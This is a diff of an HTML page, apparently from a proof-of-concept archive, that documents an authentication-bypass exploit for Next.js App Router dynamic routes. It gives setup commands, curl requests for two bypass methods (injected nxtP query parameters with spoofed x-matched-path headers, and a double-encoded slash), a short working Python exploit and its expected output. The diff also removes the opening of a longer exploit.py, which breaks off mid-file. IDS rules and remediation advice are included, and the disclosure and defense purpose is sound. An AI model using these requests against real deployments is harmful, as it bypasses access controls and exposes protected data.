@@ -391,143 +391,86 @@
 Target:      Next.js 15.4.0 - 15.5.15 or 16.0.0 - 16.2.4 with App Router dynamic routes and middleware auth
 Attacker:    Any host able to send crafted HTTP GET requests
 Tools:       python3, bash, curl
-</code></pre><h3 id="setup-steps">Setup Steps</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> next-16.2.4-pocs/poc/CVE-2026-44574_GHSA-492v-c6pp-mqqv
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">TARGET</span><span class="o">=</span>http://localhost:3000 <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">PROTECTED_BASE</span><span class="o">=</span>/admin <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">PROTECTED_SLUG</span><span class="o">=</span>secret-page <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">PUBLIC_PATH</span><span class="o">=</span>/safe <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>python3 exploit.py
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="step-by-step-reproduction">Step-by-Step Reproduction</h3>
-<ol>
-<li>
-<p><strong>Confirm baseline is blocked</strong> - canonical protected path is gated by middleware.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i http://target/admin/secret-page
-</span></span><span class="line"><span class="cl"><span class="c1"># Expect: HTTP/1.1 307  Location: /login</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>Bypass arm A</strong> - inject nxtP params on a public path.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s1">&#39;x-matched-path: /admin/[slug]&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s1">&#39;x-now-route-matches: 1=secret-page&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s2">&#34;http://target/safe?nxtPslug=secret-page&amp;__nextDefaultLocale=&amp;__nextLocale=&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Vulnerable: HTTP/1.1 200 with protected page content</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Patched:    HTTP/1.1 307  Location: /login</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>Bypass arm B</strong> - double-encoded slash mismatch.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i --path-as-is <span class="s2">&#34;http://target/admin/foo%252Fsecret-page&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Vulnerable: HTTP/1.1 200 with protected content</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Patched:    HTTP/1.1 307 or 404</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-</ol>
-<h3 id="exploit-code">Exploit Code</h3>
-<blockquote>
-<p>See <code>exploit.py</code> and <code>exploit.sh</code> in this folder.</p></blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.request</span><span class="o">,</span> <span class="nn">urllib.parse</span><span class="o">,</span> <span class="nn">urllib.error</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;http://target&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">SLUG</span> <span class="o">=</span> <span class="s2">&#34;secret-page&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">NoRedirect</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">HTTPRedirectHandler</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">redirect_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span> <span class="k">return</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">qs</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s2">&#34;nxtPslug&#34;</span><span class="p">:</span> <span class="n">SLUG</span><span class="p">,</span> <span class="s2">&#34;__nextDefaultLocale&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;__nextLocale&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl"><span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/safe?</span><span class="si">{</span><span class="n">qs</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;x-matched-path&#34;</span><span class="p">:</span> <span class="s2">&#34;/admin/[slug]&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;x-now-route-matches&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1=</span><span class="si">{</span><span class="n">SLUG</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">method</span><span class="o">=</span><span class="s2">&#34;GET&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">NoRedirect</span><span class="p">())</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">500</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="expected-output">Expected Output</h3>
-<pre tabindex="0"><code>x VULNERABLE — arm A: public path returned the protected page (sentinel &#39;ADMIN_SECRET_FLAG&#39; present).
+</code></pre><h3 id=setup-steps>Setup Steps</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
+</span></span><span class=line><span class=cl><span class=nb>cd</span> next-16.2.4-pocs/poc/CVE-2026-44574_GHSA-492v-c6pp-mqqv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>TARGET</span><span class=o>=</span>http://localhost:3000 <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>PROTECTED_BASE</span><span class=o>=</span>/admin <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>PROTECTED_SLUG</span><span class=o>=</span>secret-page <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>PUBLIC_PATH</span><span class=o>=</span>/safe <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>python3 exploit.py
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=proof-of-concept>Proof of Concept</h2><h3 id=step-by-step-reproduction>Step-by-Step Reproduction</h3><ol><li><p><strong>Confirm baseline is blocked</strong> - canonical protected path is gated by middleware.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i http://target/admin/secret-page
+</span></span><span class=line><span class=cl><span class=c1># Expect: HTTP/1.1 307  Location: /login</span>
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Bypass arm A</strong> - inject nxtP params on a public path.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -H <span class=s1>&#39;x-matched-path: /admin/[slug]&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  -H <span class=s1>&#39;x-now-route-matches: 1=secret-page&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>  <span class=s2>&#34;http://target/safe?nxtPslug=secret-page&amp;__nextDefaultLocale=&amp;__nextLocale=&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># Vulnerable: HTTP/1.1 200 with protected page content</span>
+</span></span><span class=line><span class=cl><span class=c1># Patched:    HTTP/1.1 307  Location: /login</span>
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Bypass arm B</strong> - double-encoded slash mismatch.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i --path-as-is <span class=s2>&#34;http://target/admin/foo%252Fsecret-page&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># Vulnerable: HTTP/1.1 200 with protected content</span>
+</span></span><span class=line><span class=cl><span class=c1># Patched:    HTTP/1.1 307 or 404</span>
+</span></span></code></pre></td></tr></table></div></div></li></ol><h3 id=exploit-code>Exploit Code</h3><blockquote><p>See <code>exploit.py</code> and <code>exploit.sh</code> in this folder.</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span><span class=o>,</span> <span class=nn>urllib.parse</span><span class=o>,</span> <span class=nn>urllib.error</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>TARGET</span> <span class=o>=</span> <span class=s2>&#34;http://target&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>SLUG</span> <span class=o>=</span> <span class=s2>&#34;secret-page&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>NoRedirect</span><span class=p>(</span><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>HTTPRedirectHandler</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>redirect_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span> <span class=k>return</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>qs</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>({</span><span class=s2>&#34;nxtPslug&#34;</span><span class=p>:</span> <span class=n>SLUG</span><span class=p>,</span> <span class=s2>&#34;__nextDefaultLocale&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;__nextLocale&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>req</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET</span><span class=si>}</span><span class=s2>/safe?</span><span class=si>{</span><span class=n>qs</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>headers</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;x-matched-path&#34;</span><span class=p>:</span> <span class=s2>&#34;/admin/[slug]&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;x-now-route-matches&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;1=</span><span class=si>{</span><span class=n>SLUG</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=n>method</span><span class=o>=</span><span class=s2>&#34;GET&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>build_opener</span><span class=p>(</span><span class=n>NoRedirect</span><span class=p>())</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>15</span><span class=p>)</span> <span class=k>as</span> <span class=n>r</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>500</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=expected-output>Expected Output</h3><pre tabindex=0><code>x VULNERABLE — arm A: public path returned the protected page (sentinel &#39;ADMIN_SECRET_FLAG&#39; present).
 
 &gt;&gt;&gt; RESULT: PASS (vulnerability reproduced) &lt;&lt;&lt;
-</code></pre><hr>
-<h2 id="screenshots--evidence">Screenshots / Evidence</h2>
-<ul>
-<li><code>screenshots/</code> - add captures showing protected dynamic route content returned via the public path bypass</li>
-</ul>
-<hr>
-<h2 id="detection--indicators-of-compromise">Detection &amp; Indicators of Compromise</h2>
-<pre tabindex="0"><code>GET /safe?nxtPslug=secret-page  x-matched-path: /admin/[slug]  x-now-route-matches: 1=secret-page
+</code></pre><hr><h2 id=screenshots--evidence>Screenshots / Evidence</h2><ul><li><code>screenshots/</code> - add captures showing protected dynamic route content returned via the public path bypass</li></ul><hr><h2 id=detection--indicators-of-compromise>Detection & Indicators of Compromise</h2><pre tabindex=0><code>GET /safe?nxtPslug=secret-page  x-matched-path: /admin/[slug]  x-now-route-matches: 1=secret-page
 GET /admin/foo%252Fsecret-page
-</code></pre><p><strong>SIEM / IDS Rule (example):</strong></p>
-<pre tabindex="0"><code>alert http any any -&gt; $HTTP_SERVERS any (
+</code></pre><p><strong>SIEM / IDS Rule (example):</strong></p><pre tabindex=0><code>alert http any any -&gt; $HTTP_SERVERS any (
   msg:&#34;Possible CVE-2026-44574 dynamic-route param injection bypass&#34;;
   pcre:&#34;/[?&amp;]nxtP[A-Za-z]/Q&#34;;
   sid:900044574a; rev:1;
@@ -537,495 +480,287 @@ alert http any any -&gt; $HTTP_SERVERS any (
   content:&#34;%252F&#34;; http_uri;
   sid:900044574b; rev:1;
 )
-</code></pre><hr>
-<h2 id="remediation">Remediation</h2>
-<table>
-  <thead>
-      <tr>
-          <th>Action</th>
-          <th>Detail</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><strong>Patch</strong></td>
-          <td>Upgrade Next.js to 15.5.16 or 16.2.5+</td>
-      </tr>
-      <tr>
-          <td><strong>Workaround</strong></td>
-          <td>In every protected layout or page, re-derive sensitive params from <code>params</code> (the resolved value), not from <code>request.url</code>; never trust inbound <code>nxtP*</code> query params as route context</td>
-      </tr>
-      <tr>
-          <td><strong>Config Hardening</strong></td>
-          <td>At CDN/WAF, drop or reject any inbound request whose query keys start with <code>nxtP</code>, <code>nxtI</code>, or <code>__NEXT_</code>; block requests containing <code>%252F</code> in path segments</td>
-      </tr>
-  </tbody>
-</table>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44574">CVE-2026-44574 - NVD</a></li>
-<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv">Next.js Advisory - GHSA-492v-c6pp-mqqv</a></li>
-<li><a href="https://github.com/vercel/next.js/commit/f1c11203d5">Next.js Patch Commit f1c11203d5</a></li>
-<li><a href="https://github.com/dwisiswant0/next-16.2.4-pocs">Source Repository - dwisiswant0/next-16.2.4-pocs</a></li>
-</ul>
-<hr>
-<h2 id="notes">Notes</h2>
-<p>Auto-ingested from <a href="https://github.com/dwisiswant0/next-16.2.4-pocs">https://github.com/dwisiswant0/next-16.2.4-pocs</a> on 2026-05-17.</p>
-<p>No known active exploitation at time of disclosure. The <code>nxtP*</code> / <code>nxtI*</code> injection arm is particularly dangerous in Vercel-hosted deployments where the internal proxy legitimately uses these headers, as WAF rules blocking them may cause false positives. Defense-in-depth recommendation: always authenticate inside the page/layout handler rather than relying solely on middleware pathname matching. Issue tracked as #53.</p>
-
-    </div>
-
-    <div class="mt-10 overflow-hidden rounded-lg border border-zinc-700/60 shadow-2xl">
-
-      
-      <div class="flex items-center gap-3 bg-zinc-800 px-3 py-2">
-        
-        <div class="flex shrink-0 items-center gap-1.5">
-          <span class="h-3 w-3 rounded-full bg-red-500"></span>
-          <span class="h-3 w-3 rounded-full bg-yellow-400"></span>
-          <span class="h-3 w-3 rounded-full bg-green-500"></span>
-        </div>
-        
-        <div class="flex flex-1 justify-center">
-          <div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1">
-            <span class="h-2.5 w-2.5 shrink-0 rounded-sm" style="background-color:#3b82f6"></span>
-            <span class="font-mono text-xs text-zinc-200">exploit.py</span>
-          </div>
-        </div>
-        
-        <div class="flex shrink-0 items-center gap-2">
-          <span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
-          <a href="/pocs/web/2026-05-17_nextjs-dynamic-route-injection-auth-bypass/exploit.py" target="_blank" rel="noopener"
-             class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
-          <a href="/pocs/web/2026-05-17_nextjs-dynamic-route-injection-auth-bypass/exploit.py" download="exploit.py"
-             class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a>
-        </div>
-      </div>
-
-      <div class="poc-viewer overflow-x-auto">
-        <div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">CVE-2026-44574 / GHSA-492v-c6pp-mqqv — dynamic-route param injection bypass
-</span></span></span><span class="line"><span class="cl"><span class="s2">==========================================================================
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">Usage:  TARGET=http://localhost:3000 python3 exploit.py
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">Attack model
-</span></span></span><span class="line"><span class="cl"><span class="s2">------------
-</span></span></span><span class="line"><span class="cl"><span class="s2">Next.js represents matched dynamic-route params and locale information with
-</span></span></span><span class="line"><span class="cl"><span class="s2">internal search params named `nxtP&lt;name&gt;` (path) and `nxtI&lt;name&gt;` (intercept).
-</span></span></span><span class="line"><span class="cl"><span class="s2">On vulnerable versions the router accepts these on inbound user requests
-</span></span></span><span class="line"><span class="cl"><span class="s2">and uses them when building the page&#39;s `params` object.
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">That creates a *split-view* primitive:
-</span></span></span><span class="line"><span class="cl"><span class="s2">  * Middleware sees `request.nextUrl.pathname` = /safe
-</span></span></span><span class="line"><span class="cl"><span class="s2">  * The App Router renders /admin/[slug] with slug = whatever attacker put
-</span></span></span><span class="line"><span class="cl"><span class="s2">    in `nxtPslug=...`
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">A second arm of the vulnerability is the encoded-slash double-encoding bug
-</span></span></span><span class="line"><span class="cl"><span class="s2">in `client/route-params.ts` (fixed in `f1c11203d5`) — the same primitive
-</span></span></span><span class="line"><span class="cl"><span class="s2">expressed via `</span><span class="si">%252F</span><span class="s2">` in the pathname instead of via internal params.
-</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.request</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.error</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">R</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">Y</span><span class="p">,</span> <span class="n">B</span><span class="p">,</span> <span class="n">N</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[0;31m&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[0;32m&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;33m&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[0;34m&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[0m&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">SENTINEL</span> <span class="o">=</span> <span class="s2">&#34;ADMIN_SECRET_FLAG&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
